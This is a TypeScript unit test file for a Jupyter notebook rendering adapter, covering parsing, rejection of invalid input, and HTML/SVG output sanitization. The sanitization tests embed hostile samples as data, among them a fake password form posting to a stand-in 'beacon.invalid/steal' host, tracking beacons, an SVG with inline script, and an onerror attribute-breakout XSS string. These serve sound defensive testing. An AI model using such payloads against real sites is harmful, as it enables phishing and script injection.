import { describe, it, expect } from 'vitest';
import { IpynbAdapter } from './IpynbAdapter';
import type { FileSourceReader } from '../../core/types';

function reader(json: string): FileSourceReader {
  const buffer = new TextEncoder().encode(json).buffer;
  return {
    meta: { name: 'nb.ipynb', size: buffer.byteLength, mimeType: 'application/x-ipynb+json' },
    arrayBuffer: async () => buffer,
    stream: () => null,
  };
}

const NB = JSON.stringify({
  cells: [
    { cell_type: 'markdown', source: ['# Title\n', '\n', 'body text'] },
    {
      cell_type: 'code',
      source: ['print("hi")'],
      outputs: [
        { output_type: 'stream', name: 'stdout', text: ['hi\n'] },
        { output_type: 'execute_result', data: { 'text/plain': ['42'] } },
      ],
    },
  ],
  metadata: { language_info: { name: 'python' } },
  nbformat: 4,
});

describe('IpynbAdapter', () => {
  it('parses a notebook into one page with a heading outline', async () => {
    const adapter = new IpynbAdapter();
    const model = await adapter.parse(reader(NB), new AbortController().signal);
    expect(model.format).toBe('ipynb');
    expect(model.pageCount).toBe(1);
    expect(model.outline?.[0]?.title).toBe('Title');

    const layer = await adapter.getTextLayer(0);
    const text = layer.items.map((i) => i.str).join('\n');
    expect(text).toContain('print("hi")');
    expect(text).toContain('body text');
  });

  it('rejects content that is not a valid notebook', async () => {
    const adapter = new IpynbAdapter();
    await expect(
      adapter.parse(reader('not json'), new AbortController().signal),
    ).rejects.toThrow();
    await expect(
      adapter.parse(reader('{"nope":true}'), new AbortController().signal),
    ).rejects.toThrow();
  });

  it('sanitizes rich outputs with the strict document allow-list', async () => {
    const html = [
      '<style>body::after{content:"HOST RESTYLED"}</style>',
      '<link rel="stylesheet" href="https://beacon.invalid/x.css">',
      '<form action="https://beacon.invalid/steal"><input type="password" name="pw"><button>Sign in</button></form>',
      '<video poster="https://beacon.invalid/p.png" src="https://beacon.invalid/v.mp4"></video>',
      '<table style="background:url(https://beacon.invalid/t.png)"><tr><td>cell</td></tr></table>',
      '<p>kept <b>bold</b></p>',
    ].join('');
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><script>window.__pwned=1</script>' +
      '<image href="https://beacon.invalid/i.png"/><circle r="4"/></svg>';
    const nb = JSON.stringify({
      cells: [
        {
          cell_type: 'code',
          source: [''],
          outputs: [
            { output_type: 'display_data', data: { 'text/html': html } },
            { output_type: 'display_data', data: { 'image/svg+xml': svg } },
          ],
        },
      ],
      metadata: { language_info: { name: 'python' } },
      nbformat: 4,
    });
    const adapter = new IpynbAdapter();
    await adapter.parse(reader(nb), new AbortController().signal);
    const target = document.createElement('div');
    await adapter.renderPage({
      page: { index: 0, width: 900, height: 600, rotation: 0 },
      target,
      scale: 1,
      rotation: 0,
      devicePixelRatio: 1,
      signal: new AbortController().signal,
    });

    for (const sel of ['style', 'link', 'form', 'input', 'button', 'video', 'script', 'svg', 'image']) {
      expect(target.querySelector(sel), sel).toBeNull();
    }
    expect(target.innerHTML).not.toContain('beacon.invalid');
    expect(target.textContent).toContain('cell');
    expect(target.querySelector('b')?.textContent).toBe('bold');
    const svgImg = target.querySelectorAll('img')[0];
    expect(svgImg?.getAttribute('src')?.startsWith('data:image/svg+xml;base64,')).toBe(true);
  });

  it('does not let a malicious image output break out of the src attribute', async () => {
    const malicious = JSON.stringify({
      cells: [
        {
          cell_type: 'code',
          source: [''],
          outputs: [
            {
              output_type: 'execute_result',
              data: { 'image/png': 'x"onerror="alert(document.domain)' },
            },
          ],
        },
      ],
      metadata: { language_info: { name: 'python' } },
      nbformat: 4,
    });
    const adapter = new IpynbAdapter();
    await adapter.parse(reader(malicious), new AbortController().signal);

    const target = document.createElement('div');
    await adapter.renderPage({
      page: { index: 0, width: 900, height: 600, rotation: 0 },
      target,
      scale: 1,
      rotation: 0,
      devicePixelRatio: 1,
      signal: new AbortController().signal,
    });

    expect(target.querySelector('[onerror]')).toBeNull();
    const img = target.querySelector('img.dv-ipynb-img');
    expect(img).not.toBeNull();
    const src = img!.getAttribute('src') ?? '';
    expect(src).not.toContain('"');
    expect(src.startsWith('data:image/png;base64,')).toBe(true);
  });
});
